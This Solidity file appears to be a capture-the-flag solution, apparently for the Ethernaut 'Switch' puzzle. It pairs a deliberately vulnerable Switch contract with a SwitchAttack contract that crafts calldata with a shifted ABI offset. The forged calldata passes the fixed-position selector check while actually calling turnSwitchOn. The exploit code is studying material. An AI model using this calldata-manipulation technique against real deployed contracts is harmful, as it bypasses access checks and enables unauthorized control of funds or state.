// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}

contract SwitchAttack {
    function attack(address _target) external {
        //selector
        bytes4 flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
        //pointer
        bytes32 offset = bytes32(uint256(0x60));
        //data length(padding to satisfy the checker)
        bytes32 padding = bytes32(0);
        //to statisfy the checker
        bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));
        // This fills the 28-byte gap between the offSelector and the dataLength
        bytes memory extraPadding = new bytes(28);
        bytes32 dataLength = bytes32(uint256(4));
        //132-164 excute
        bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));

        bytes memory payload = abi.encodePacked(
            flipSelector,
            offset,
            padding,
            offSelector,
            extraPadding,
            dataLength,
            onSelector
        );

        (bool success, ) = _target.call(payload);
        require(success, "Attack failed");
    }
}
